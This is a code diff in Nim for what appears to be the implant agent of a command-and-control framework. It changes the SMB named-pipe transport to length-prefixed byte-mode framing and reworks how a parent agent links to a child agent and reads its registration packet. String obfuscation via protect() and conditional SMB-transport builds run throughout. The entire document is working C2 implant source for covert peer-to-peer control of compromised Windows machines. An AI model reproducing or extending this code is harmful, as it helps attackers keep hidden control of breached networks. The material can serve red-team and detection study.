@@ -6,37 +6,48 @@ import ../../../../types/[common, agent]
 
 const PIPE_BUFFER_MAX = 0x10000 # 65536 
 
-# Helper functions
 proc pipeWrite*(hPipe: HANDLE, data: seq[byte]): bool {.discardable.} = 
-    var 
+    var
         dwBytesWritten: DWORD = 0
         dwTotal: DWORD = 0
-    
-    while dwTotal < cast[DWORD](data.len()):             
-        if WriteFile(hPipe, cast[LPCVOID](addr data[dwTotal]), min(cast[DWORD](data.len()) - dwTotal, PIPE_BUFFER_MAX), addr dwBytesWritten, NULL) == FALSE: 
+        dwSize: DWORD = cast[DWORD](data.len())
+
+    # Write data length
+    if WriteFile(hPipe, cast[LPCVOID](addr dwSize), 4, addr dwBytesWritten, NULL) == FALSE:
+        return false
+
+    # Write chunks
+    while dwTotal < dwSize:             
+        if WriteFile(hPipe, cast[LPCVOID](addr data[dwTotal]), min(dwSize - dwTotal, PIPE_BUFFER_MAX), addr dwBytesWritten, NULL) == FALSE: 
             return false
         dwTotal += dwBytesWritten
-    
+
     FlushFileBuffers(hPipe)
     return true
 
-proc pipeRead*(hPipe: HANDLE, size: DWORD): seq[byte] = 
-    var 
+proc pipeRead*(hPipe: HANDLE): seq[byte] = 
+    var
         dwBytesRead: DWORD = 0
         dwTotal: DWORD = 0
-    
-    result = newSeq[byte](size)
-    while dwTotal < size:            
-        if ReadFile(hPipe, cast[LPVOID](addr result[dwTotal]), min(size - dwTotal, PIPE_BUFFER_MAX), addr dwBytesRead, NULL) == FALSE:
+        dwSize: DWORD = 0
+
+    # Read data length
+    if ReadFile(hPipe, cast[LPVOID](addr dwSize), 4, addr dwBytesRead, NULL) == FALSE:
+        return @[]
+
+    if dwSize == 0:
+        return @[]
+
+    # Read chunks
+    result = newSeq[byte](dwSize)
+    while dwTotal < dwSize:            
+        if ReadFile(hPipe, cast[LPVOID](addr result[dwTotal]), min(dwSize - dwTotal, PIPE_BUFFER_MAX), addr dwBytesRead, NULL) == FALSE:
             if GetLastError() != ERROR_MORE_DATA:
                 return @[]
         dwTotal += dwBytesRead
 
 proc smbRead*(ctx: AgentCtx, hPipe: HANDLE): string = 
-    var 
-        dwSize: DWORD = 0
-        temp: seq[byte] = @[]
-        data: seq[byte] = @[]
+    var dwSize: DWORD = 0
 
     if PeekNamedPipe(hPipe, NULL, 0, NULL, addr dwSize, NULL) == FALSE:
         when defined(TRANSPORT_SMB):
@@ -46,47 +57,41 @@ proc smbRead*(ctx: AgentCtx, hPipe: HANDLE): string =
             ctx.transport.hPipe = 0
         return ""
 
-    # Read data until pipe is empty (for messages that exceed the size limit of the named pipe)
-    while dwSize > 0:
-        temp = hPipe.pipeRead(dwSize)
-        if temp.len() == 0:
-            return Bytes.toString(data)
-        data.add(temp)
-        
-        if PeekNamedPipe(hPipe, NULL, 0, NULL, addr dwSize, NULL) == FALSE:
-            break
-    
-    return Bytes.toString(data)
+    when defined(TRANSPORT_SMB):
+        # SMB transport agent: block and read the full framed message
+        return Bytes.toString(hPipe.pipeRead())
+    else:
+        # Parent agent polling linked child: non-blocking, only read if data available
+        if dwSize == 0:
+            return ""
+        return Bytes.toString(hPipe.pipeRead())
 
 # Agent linking
 proc link*(ctx: AgentCtx, pipeName: string): seq[byte] =   
     var 
         hPipe: HANDLE = 0
         dwSize: DWORD = 0
-        dwBytesRead: DWORD = 0
         data: seq[byte]
 
-    # Connect to named pipe 
     hPipe = CreateFileW(+$pipeName, GENERIC_READ or GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, 0)
     if hPipe == INVALID_HANDLE_VALUE: 
         raise newException(CatchableError, GetLastError().getError())
     
     if GetLastError() == ERROR_PIPE_BUSY:
-        # https://learn.microsoft.com/de-de/windows/win32/api/namedpipeapi/nf-namedpipeapi-waitnamedpipew
         if WaitNamedPipeW(+$pipeName, 5000) == FALSE:
             raise newException(CatchableError, GetLastError().getError())
 
+    # Wait for registration packet
     while true:
-        # https://learn.microsoft.com/de-de/windows/win32/api/namedpipeapi/nf-namedpipeapi-peeknamedpipe
         if PeekNamedPipe(hPipe, NULL, 0, NULL, addr dwSize, NULL) == FALSE:
             CloseHandle(hPipe)
             raise newException(CatchableError, GetLastError().getError())
 
         if dwSize > 0:
-            data = newSeq[byte](dwSize)
-            if ReadFile(hPipe, cast[LPVOID](addr data[0]), dwSize, addr dwBytesRead, NULL) == FALSE:
+            data = hPipe.pipeRead()
+            if data.len() == 0:
                 CloseHandle(hPipe)
-                raise newException(CatchableError, GetLastError().getError())            
+                raise newException(CatchableError, protect("Failed to read registration packet."))
             break 
     
     # Parse registration packet
@@ -133,14 +138,14 @@ when defined(TRANSPORT_SMB):
         openSmbSecurityAttributes(addr smbSecAttr, addr secAttr)
         
         ctx.transport.hPipe = CreateNamedPipeW(
-            +$ctx.transport.pipe,                                       # Pipe name
-            PIPE_ACCESS_DUPLEX,                                         # R/W access
-            PIPE_TYPE_MESSAGE or PIPE_READMODE_MESSAGE or PIPE_WAIT,    # Pipe modes
-            PIPE_UNLIMITED_INSTANCES,                                   # Max. instances
-            PIPE_BUFFER_MAX,                                            # Output buffer
-            PIPE_BUFFER_MAX,                                            # Input buffer
-            0,                                                          # Client timeout
-            addr secAttr                                                # Security attributes
+            +$ctx.transport.pipe,
+            PIPE_ACCESS_DUPLEX,
+            PIPE_TYPE_BYTE or PIPE_READMODE_BYTE or PIPE_WAIT,  # byte mode for framing
+            PIPE_UNLIMITED_INSTANCES,
+            PIPE_BUFFER_MAX,
+            PIPE_BUFFER_MAX,
+            0,
+            addr secAttr
         )
         
         freeSmbSecurityAttributes(addr smbSecAttr)
@@ -150,7 +155,6 @@ when defined(TRANSPORT_SMB):
             raise newException(CatchableError, protect("Failed to create pipe"))
     
     proc smbWrite*(ctx: AgentCtx, data: seq[byte]): bool = 
-        # Create pipe and wait for SMB agent to get linked
         if ctx.transport.hPipe == 0:
             ctx.createPipe()
             print protect("Waiting for connection.")
@@ -161,7 +165,6 @@ when defined(TRANSPORT_SMB):
                     return false
             return ctx.transport.hPipe.pipeWrite(data)
         
-        # Pipe was already created, write data to the pipe
         if not ctx.transport.hPipe.pipeWrite(data):
             let err = GetLastError()
             if err == ERROR_NO_DATA:
